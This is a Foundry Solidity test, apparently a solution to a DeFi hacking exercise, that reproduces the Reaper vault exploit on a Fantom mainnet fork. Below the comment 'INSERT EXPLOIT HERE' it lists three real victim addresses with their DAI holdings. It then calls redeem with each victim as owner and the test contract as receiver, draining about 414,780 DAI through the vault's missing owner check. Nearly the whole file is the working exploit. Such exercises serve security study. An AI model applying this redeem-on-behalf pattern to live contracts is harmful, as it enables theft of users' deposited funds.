// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/ReaperVaultV2.sol";

interface IERC20Like {
    function balanceOf(address _addr) external view returns (uint);
}

contract CounterTest is Test {
    ReaperVaultV2 reaper = ReaperVaultV2(0x77dc33dC0278d21398cb9b16CbFf99c1B712a87A);
    IERC20Like fantomDai = IERC20Like(0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E);

    function testReaperHack() public {
        vm.createSelectFork(vm.envString("FANTOM_RPC"), 44000000);
        console.log("Your Starting Balance:", fantomDai.balanceOf(address(this)));
        
        // INSERT EXPLOIT HERE
        address[] memory victims = new address[](3);
        // 271_744 DAI
        victims[0] = 0xEB7a12fE169C98748EB20CE8286EAcCF4876643b;
        // 87_603 DAI
        victims[1] = 0xfc83DA727034a487f031dA33D55b4664ba312f1D; 
        // 53_809 DAI
        victims[2] = 0x954773dD09a0bd708D3C03A62FB0947e8078fCf9;
        // redeem
        for (uint256 i; i < victims.length; ++i) reaper.redeem(reaper.balanceOf(victims[i]), address(this), victims[i]);
        // final balance 414_780 DAI
        console.log("Your Final Balance:", fantomDai.balanceOf(address(this)));
        assert(fantomDai.balanceOf(address(this)) > 400_000 ether);
    }
}
